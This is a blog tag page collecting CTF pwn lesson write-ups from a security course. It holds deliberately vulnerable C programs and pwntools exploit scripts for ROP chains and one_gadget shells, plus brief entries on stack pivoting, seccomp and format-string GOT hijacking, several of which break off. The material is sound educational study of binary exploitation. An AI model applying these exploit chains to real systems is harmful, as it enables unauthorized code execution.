<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/ctf/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="CTF"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>CTF | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/ctf/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/ctf/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>CTF</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x07rop/>Simple PWN - 0x07(ROP)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x07rop>Simple PWN - 0x07(ROP)
<a class=anchor href=#simple-pwn---0x07rop>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>This is very similar to normal <code>BOF</code>.</li><li>If a sample code that doesn&rsquo;t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode.</li><li>Therefore, the main idea is use some <code>&lt;operation>;ret</code> pattern segment to overlap stack.
<img src=https://imgur.com/YGarADK.png alt></li></ul><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class="language-c!=1" data-lang="c!=1">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main()
{
    setvbuf(stdin, 0, _IONBF, 0)
    setvbuf(stdout, 0, _IONBF, 0);

    char s[0x10];

    printf(&#34;Here is your \&#34;/bin/sh\&#34;: %p\n&#34;, &#34;/bin/sh&#34;);
    printf(&#34;Give me your ROP: &#34;);
    read(0, s, 0x400);
    
    return 0;
}
</code></pre><ul><li>At line <code>11</code>, <code>%p</code> means pointer of <code>/bin/sh</code> string.</li><li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use <code>checksec</code> to observe the protection. In addition, please use <code>-static</code> command to compile library at compile time, so that we can get <code>ROP gadget</code> more easily.<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
</code></pre></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ul><li>First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use <code>ROP gadget</code> to construct chain.</li><li>Second, we use <code>ROPgadget</code> to find suitable gadget<pre tabindex=0><code class=language-bash! data-lang=bash!>$ ROPgadget --multibr --binary rop &gt; rop_gadget
$ vim rop_gadget
</code></pre><img src=https://imgur.com/IzeTvgK.png alt>
<img src=https://imgur.com/PlA5C8B.png alt>
<img src=https://imgur.com/zg28Pti.png alt>
<img src=https://imgur.com/WDS0HUh.png alt>
<img src=https://imgur.com/dEh7b5n.png alt="reference link"><ul><li>Note that, you may consider that <code>pop rdx ; pop rbx ; ret</code> is not what we want. We just want <code>pop rdx ; ret</code>. Therefore, we have to push one more value for <code>pop rbx ;</code> instruction.</li></ul></li><li>Then, we can construct our payload:<pre tabindex=0><code class="language-python!=" data-lang="python!=">from pwn import *

context.arch = &#39;amd64&#39;

r = process(&#39;./rop&#39;)

r.recvuntil(&#39;Here is your &#34;/bin/sh&#34;: &#39;)
binsh = int(r.recvline()[:-1], 16)
info(f&#34;binsh: {hex(binsh)}&#34;)

pop_rdi_ret = 0x401eaf
pop_rsi_ret = 0x409ede
pop_rdx_ret = 0x485aeb
pop_rax_ret = 0x44fcc7
syscall = 0x401c64
</code></pre><ul><li>Note that, <code>r.recvline()[:-1]</code> is <code>b'0x498004'</code> and we must pop to <code>%rdi</code> at line <code>17</code> below.</li></ul></li><li>Then we can combine them together using <a href=https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat>flat method</a>. It&rsquo;ll flat the address with <strong>length 8 bytes</strong>.<pre tabindex=0><code class="language-python!=16" data-lang="python!=16">ROP = flat(
    pop_rdi_ret, binsh,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0, 0,
    pop_rax_ret, 0x3b,
    syscall,
)

gdb.attach(r)
r.sendafter(&#34;Give me your ROP: &#34;, b&#39;a&#39; * 0x18 + ROP)

r.interactive()
</code></pre></li><li>Finally, we got shell!!!
<img src=https://imgur.com/dk0Z2mw.png alt></li></ul><h2 id=analysis>Analysis
<a class=anchor href=#analysis>#</a></h2><ul><li>This is totally the same as our hypothesis.
<img src=https://imgur.com/OjcDNbu.png alt></li><li>We can see that all parameters are ready
<img src=https://imgur.com/xXx7HRQ.png alt></li></ul><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href="https://youtu.be/iA4Hrr17ooI?t=1239">NTUSTISC - Pwn Basic 3 [2019.03.26]</a>
<a href="https://youtu.be/ktoVQB99Gj4?t=6712">Pwn week1</a></p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x07rop/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/>Simple PWN - 0x08(one_gadget with ROP)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x08one_gadget-with-rop>Simple PWN - 0x08(one_gadget with ROP)
<a class=anchor href=#simple-pwn---0x08one_gadget-with-rop>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=one_gadget-background>one_gadget background
<a class=anchor href=#one_gadget-background>#</a></h2><p><a href=https://ithelp.ithome.com.tw/articles/10226977>Day25: [Misc] 我從來沒想過我會害怕寫 code</a></p><blockquote><p>原理是在 <code>glibc</code> 裡面有很多會透過 <code>execve</code> 執行 <code>/bin/sh</code>、再調用外部系統指令的 assembly，當 explolit 已經得知 <code>libc</code> 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數</p></blockquote><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IOBNF, 0);

    char s[0x10];

    printf(&#34;Your libc: %p&#34;, printf);
    read(0, s, 0x100);

    return 0;
}
</code></pre><ul><li>The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use <code>ROP</code> to get shell.</li><li>Note that, it must be a dynamic library, so DO NOT use <code>-static</code> to compile it.<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack
</code></pre></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ul><li>First, we use <a href=https://shengyu7697.github.io/linux-ldd/><font color=FF0000><code>ldd</code></font></a> command to find what library the program will use.
<img src=https://imgur.com/ycRb8Tv.png alt></li><li>In addition, we use <code>one_gadget</code> command to find <code>execvs</code><ul><li>Note that, how to use it can refer to <a href=https://blog.csdn.net/weixin_43092232/article/details/105085880>one_gadget用法</a></li><li>We use <code>0xebcf8 execve("/bin/sh", rsi, rdx)</code> as our method
<img src=https://imgur.com/Y7BBH5J.png alt><ul><li><font color=FF0000>Note:</font> it has 3 constraint so that we can get the shell</li></ul><pre tabindex=0><code class=language-bash! data-lang=bash!>address rbp-0x78 is writable
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
</code></pre></li></ul></li><li>Then, we use <code>one_gadget</code> command to get <code>ROP</code> chain<pre tabindex=0><code class=language-bash! data-lang=bash!>ROPgadget --binary one_gadget_with_rop --only &#34;pop|ret&#34; &gt; one_gadget
vim one_gadget
</code></pre>You can see that because we didn&rsquo;t compile with library, the gadget that we may can use is very few.
<img src=https://imgur.com/DuGINHL.png alt>
The solution is using the gadget that <code>libc</code> have:<pre tabindex=0><code class=language-bash! data-lang=bash!>$ ROPgadget --binary  /lib/x86_64-linux-gnu/libc.so.6 --only &#34;pop|ret&#34; &gt; one_gadget
$ vim one_gadget
</code></pre>We must satisfied one_gadget constraint. <code>0x90529</code> and <code>0x2be51</code> are the offset of <code>/lib/x86_64-linux-gnu/libc.so.6</code>. Therefore, if we want to call these gadget, <font color=FF0000>we must find out the real base address of <code>/lib/x86_64-linux-gnu/libc.so.6</code></font>.
<img src=https://imgur.com/3h5PqcO.png alt>
<img src=https://imgur.com/Z2bBbhJ.png alt></li><li>Because, <code>ASLR</code> is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the <code>printf</code> address in <code>/lib/x86_64-linux-gnu/libc.so.6</code> → <font color=FF0000><code>0x7ffff7def770</code></font>
<img src=https://imgur.com/nuYGx24.png alt>
Used <code>gdb</code> can find the current address of library → <font color=FF0000><code>0x7ffff7d8f000</code></font>
<img src=https://imgur.com/Et3r2hI.png alt>
Then we can know the offset and construct apart of payload as below
$$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$<pre tabindex=0><code class="language-python!=" data-lang="python!=">from pwn import *
import sys

context.arch = &#39;amd64&#39;

r = process(&#39;./one_gadget_with_rop&#39;)

r.recvuntil(&#34;Your libc: &#34;)
libc = int(r.recv(14), 16) - 0x60770
info(f&#34;libc: {hex(libc)}&#34;)
</code></pre></li><li>And prepare our gadget:<pre tabindex=0><code class="language-python!=11" data-lang="python!=11">pop_rdx_rbx_ret = libc + 0x90529
pop_rsi_ret = libc + 0x2be51
</code></pre></li><li>Construct whole payload with considering the constraint:<pre tabindex=0><code class="language-python!=13" data-lang="python!=13">r.send(b&#39;a&#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
r.interactivae()
</code></pre><ul><li><code>b'a'*0x10</code> is for <code>$rsi</code></li><li><code>p64(0x404000)</code> is an arbitrary writable and readable address for <code>$rbp-0x78</code> one of the constraint of one_gadget</li><li><code>p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0)</code> is what we did in <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/rki3GF0cs>last lecture</a> of <code>ROP</code></li><li><code>p64(libc+0xebcf8)</code> is the one_gadget that we choose at the beginning.</li></ul></li><li>Finally, we got shell!!!
<img src=https://imgur.com/iIETaBy.png alt></li></ul><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://shengyu7697.github.io/linux-ldd/>Linux ldd 查看執行檔執行時需要哪些 library</a>
<a href=https://youtu.be/ktoVQB99Gj4>Pwn week1</a></p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/>Simple PWN - 0x09(stack pivoting)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x09stack-pivoting>Simple PWN - 0x09(stack pivoting)
<a class=anchor href=#simple-pwn---0x09stack-pivoting>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=stack-pivoting-background>Stack Pivoting background
<a class=anchor href=#stack-pivoting-background>#</a></h2><p><a href="https://youtu.be/iA4Hrr17ooI?t=6865">NTUSTISC - Pwn Basic 3 [2019.03.26]</a>
<a href="https://youtu.be/ktoVQB99Gj4?t=7898">Pwn week1</a>
It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed.
More detailed info. can refer to <a href="https://youtu.be/5D7tvxpSUUM?t=9543">Binary Exploitation (Pwn)</a></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

char name[0x80]

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char s[0x10];

    printf(&#34;Give me your name: &#34;);
    read(0, name, 0x80);

    printf(&#34;Give me your ROP: &#34;);
    read(0, s, 0x20);

    return 0;
}
</code></pre><ul><li>You can observe that it has not much stack buffer overflow can use, but it has global variable <code>name</code> with space <code>0x80</code>(can be another stack)<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static
</code></pre></li><li><font color=FF0000>Note that</font>:
must use <code>mprotect</code> to change permission of global variable <code>name</code> just like <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci>lecture 0x04</a>, add these line in original code<pre tabindex=0><code class=language-c! data-lang=c!>#include &lt;sys/mman.h&gt;
mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
</code></pre><strong>Before <code>mprotect</code> - <code>vmmap</code></strong>
<img src=https://imgur.com/z8cK5SM.png alt>
<img src=https://imgur.com/J6qKJ8N.png alt>
<strong>After <code>mprotect</code> - <code>vmmap</code></strong>
<img src=https://imgur.com/gNr8Fya.png alt></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ol><li><p>Construct <code>ROP</code> chain</p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x10seccomplab---rop2win>Simple PWN - 0x10(<code>seccomp</code>/Lab - <code>rop2win</code>)
<a class=anchor href=#simple-pwn---0x10seccomplab---rop2win>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>challenge: <code>nc edu-ctf.zoolab.org 10005</code></p><h2 id=seccomp-background><code>seccomp</code> background
<a class=anchor href=#seccomp-background>#</a></h2><p><a href="https://youtu.be/ktoVQB99Gj4?t=8457">Pwn week1</a></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;seccomp.h&gt;

char fn[0x20];
char ROP[0x100];


// fd = open(&#34;flag&#34;, 0);
// read(fd, buf, 0x30);
// write(1, buf, 0x30); // 1 --&gt; stdout

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    printf(&#34;Give me filename: &#34;);
    read(0, fn, 0x20);

    printf(&#34;Give me ROP: &#34;);
    read(0, ROP, 0x100);

    char overflow[0x10];
    printf(&#34;Give me overflow: &#34;);
    read(0, overflow, 0x30);

    return 0;
}
</code></pre><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/>Simple PWN - 0x11(format string bug)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x11format-string-bug>Simple PWN - 0x11(format string bug)
<a class=anchor href=#simple-pwn---0x11format-string-bug>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=format-string-bug-background>format string bug background
<a class=anchor href=#format-string-bug-background>#</a></h2><p><a href=https://www.geeksforgeeks.org/g-fact-31/>printf %n</a>
<img src=https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg alt></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char fmt[0x20];

    system(&#34;echo &#39;Give me fmt: &#39;&#34;);
    read(0, fmt, 0x20);
    printf(fmt);

    system(&#34;echo &#39;Give me string: &#39;&#34;);
    read(0, fmt, 0x20);
    puts(fmt);

    return 0;
}
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>$ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
</code></pre><ul><li>In this problem, we can consider to use <code>format string bug</code> to achieve <code>GOT hijacking</code> without buffer overflow.</li><li><strong>The main idea is totally the same as <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/S1BBpSR5s>GOT hijacking lecture</a></strong></li><li>Thus, we can observe which function can be overlapped by <code>system plt</code> → <font color=FF0000><strong><code>puts function</code></strong></font><ul><li>Because&mldr;
<code>puts</code> just needs one argument like <code>system</code> function, but how about <code>printf</code>?
Unfortunately, it appeared before 2nd read function, because 2nd <code>read</code> needs to store the argument for <code>system</code> function such as <code>sh\x00</code>.</li></ul></li></ul><h2 id=exploit---got-hijacking--format-string-bug>Exploit - GOT hijacking + format string bug
<a class=anchor href=#exploit---got-hijacking--format-string-bug>#</a></h2><p><strong>Our goal is hijack <code>puts GOT</code> to <code>system plt</code></strong></p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/>Simple PWN - 0x12(Lab - `rop++`)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x12lab---rop>Simple PWN - 0x12(Lab - <code>rop++</code>)
<a class=anchor href=#simple-pwn---0x12lab---rop>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>challenge: <code>nc edu-ctf.zoolab.org 10004</code></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int main()
{
    char buf[0x10];
    const char *msg = &#34;show me rop\n&gt; &#34;;

    write(1, msg, strlen(msg));
    read(0, buf, 0x200);

    return 0;
}
</code></pre><pre tabindex=0><code class=language-makefile! data-lang=makefile!>gcc -fno-stack-protector -static -o chal rop++.c
</code></pre><h2 id=analyze>Analyze
<a class=anchor href=#analyze>#</a></h2><ul><li><p>Obviously buffer overflow!!!</p></li><li><p>Check protector</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ checksec chal
[*] &#39;/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></li><li><p>Preliminary idea is using <code>ROP</code> chain and get shell, but the problem is where can I write <code>/bin/sh\x00</code>? We can use <code>vmmap</code> to observe where section is writable and readable → <code>0x4c5000~0x4c800</code>
<img src=https://imgur.com/018Nk8F.png alt></p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/>Simple PWN - 0x13(Lab - `how2know`)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x13lab---how2know>Simple PWN - 0x13(Lab - <code>how2know</code>)
<a class=anchor href=#simple-pwn---0x13lab---how2know>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>challenge: <code>nc edu-ctf.zoolab.org 10002</code>
Environment Version: 22.04</p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;seccomp.h&gt;
#include &lt;sys/mman.h&gt;
